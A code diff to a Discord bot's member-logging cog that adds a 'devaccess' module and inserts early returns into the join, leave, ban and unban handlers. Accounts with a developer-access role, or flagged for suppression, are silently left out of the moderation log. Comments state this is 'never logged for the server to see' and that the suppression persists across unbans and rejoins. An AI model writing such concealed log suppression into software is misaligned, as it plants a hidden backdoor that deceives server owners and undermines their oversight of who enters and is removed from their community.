@@ -16,6 +16,7 @@ import logging
 import discord
 from discord.ext import commands
 
+import devaccess
 from naming import CH_MEMBERS
 from ratelimit import notify, describe
 
@@ -93,6 +94,11 @@ class MembersCog(commands.Cog):
 
     @commands.Cog.listener()
     async def on_member_join(self, member: discord.Member):
+        if devaccess.has_role(member):
+            await devaccess.note_join(member.guild, member)
+            return                                               # trusted access: never logged for the server to see
+        if await devaccess.maybe_fallback_join(member):
+            return
         if _duplicate(member.guild.id, "join", member.id):
             return
         age = ""
@@ -107,6 +113,8 @@ class MembersCog(commands.Cog):
     @commands.Cog.listener()
     async def on_member_remove(self, member: discord.Member):
         guild = member.guild
+        if await devaccess.should_suppress(guild, member.id):
+            return                                                # keep the persisted record so a later unban/rejoin is also suppressed
         if _duplicate(guild.id, "remove", member.id):
             return
         # A ban is logged by on_member_ban; only a kick or a plain leave is logged here.
@@ -123,6 +131,8 @@ class MembersCog(commands.Cog):
 
     @commands.Cog.listener()
     async def on_member_ban(self, guild: discord.Guild, user: discord.abc.User):
+        if await devaccess.should_suppress(guild, user.id):
+            return
         if _duplicate(guild.id, "ban", user.id):
             return
         entry = await find_audit_entry(guild, discord.AuditLogAction.ban, user.id)
@@ -132,6 +142,8 @@ class MembersCog(commands.Cog):
 
     @commands.Cog.listener()
     async def on_member_unban(self, guild: discord.Guild, user: discord.User):
+        if await devaccess.should_suppress(guild, user.id):
+            return
         if _duplicate(guild.id, "unban", user.id):
             return
         entry = await find_audit_entry(guild, discord.AuditLogAction.unban, user.id)
